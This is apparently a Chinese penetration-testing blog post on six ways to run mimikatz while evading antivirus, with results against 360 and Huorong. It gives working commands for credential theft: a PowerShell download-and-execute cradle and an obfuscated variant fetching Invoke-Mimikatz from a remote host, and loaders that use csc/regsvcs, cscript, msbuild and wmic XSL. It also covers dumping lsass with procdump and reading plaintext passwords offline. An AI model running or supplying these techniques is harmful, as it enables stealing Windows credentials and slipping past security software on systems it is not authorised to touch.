---
title: 几种姿势运行mimikatz
copyright: true
categories: 内网渗透
tags:
  - mimikatz
  - 内网渗透
  - Windows
  - 密码抓取
abbrlink: b80a3101
date: 2020-01-21 16:33:50
---

<blockquote class="blockquote-center">醉后不知天在水，满船清梦压星河</blockquote>
　　[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)是一款能够从Windows认证(LSASS)的进程中获取内存，并且获取明文密码和NTLM哈希值的神器，内网渗透中常用mimikatz获取明文密码或者获取hash值来漫游内网。但是在实际的运用中，常常会遇到杀软的拦截，所以这里我借鉴网上的资料，进行复现学习，达到免杀绕过的目的。有些方式没有复现成功我就没有写出来了，有一些成功之后似乎也会被拦截了。

<!-- more -->

### 姿势一：powershell

```
https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1
```

cmd下执行，360没有拦截

```
powershell -exec bypass "import-module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz"
```

![](https://img-blog.csdnimg.cn/20200121170101542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

powershell运行会被拦截

```
powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.30.139/Invoke-Mimikatz.ps1');Invoke-Mimikatz
```

简单混淆还是被拦截了

```
powershell -c " ('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+'g'+'('+'1vchttp://'+'192.168.30'+'.139/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX"
```

![](https://img-blog.csdnimg.cn/20200121170151693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)



### 姿势二：使用.net2.0免杀mimikatz

首先下载[katz.cs](https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs)，并放在对应的系统版本的Framework目录中

```
32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727
64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727
```

然后在powershell中执行命令生成key.snk

```
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte
```

![](https://img-blog.csdnimg.cn/20200121170244836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

最后生成mimikatz，再运行

32位：

```
C:\Windows\Microsoft.NET\Framework\v2.0.50727>.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727>.\regsvcs.exe katz.exe
```

64位：

```
C:\Windows\Microsoft.NET\Framework64\v2.0.50727>.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727>.\regsvcs.exe katz.exe
```

![](https://img-blog.csdnimg.cn/20200121170309105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

很不幸，又被360发现了

![](https://img-blog.csdnimg.cn/20200121170315301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

然而，火绒又过了，没有一点提示

![](https://img-blog.csdnimg.cn/2020012117033218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

### 姿势三：js加载mimikatz

下载[katz.js](https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js)，执行

```
cscript mimikatz.js
```

![](https://img-blog.csdnimg.cn/20200121170351882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

360拦截，但是火绒过了，没有反应

![](https://img-blog.csdnimg.cn/20200121170415243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

### 姿势四：.net4.0加载mimikatz

下载[mimikatz.xml](https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20mimikatz.xml)，执行

```
cd C:\Windows\Microsoft.NET\Framework64\v4.0.30319
msbuild.exe mimikatz.xml
```

过360，并没有拦截

![](https://img-blog.csdnimg.cn/2020012117042858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

火绒同样没报

![](https://img-blog.csdnimg.cn/20200121170443216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

### 姿势五：Jscript的xsl版

下载[mimikatz.xsl](http://https:/gist.github.com/manasmbellani/7f3e39170f5bc8e3a493c62b80e69427/raw/87550d0fc03023bab99ad83ced657b9ef272a3b2/mimikatz.xsl)

本地加载

```
wmic os get /format:"mimikatz.xsl"
```

360、火绒都没有拦截

![](https://img-blog.csdnimg.cn/20200121170452294.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

### 姿势六：导出lsass进程离线读取密码

mimikatz+procdump

下载[prodump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)，管理员权限运行

```
procdump64.exe -accepteula -ma lsass.exe 1.dmp
```

![](https://img-blog.csdnimg.cn/20200121173245924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

也可以在任务管理器中导出文件

![](https://img-blog.csdnimg.cn/20200121170532859.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

然后把dmp文件导出到本地使用mimikatz读取密码

```
mz64.exe "sekurlsa::minidump 1.dmp" "sekurlsa::logonPasswords full" exit
```

![](https://img-blog.csdnimg.cn/20200121170552584.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)

这里需要注意的是win10下的密码抓取方式是不太一样的，具体看另一篇文章：[Windows10明文密码抓取](http://localhost:4000/posts/b500df40.html/)。

win7下拿到dmp文件后，就可以导出读取明文密码。

![](https://img-blog.csdnimg.cn/20200121170615615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1pfWl9XXw==,size_16,color_FFFFFF,t_70)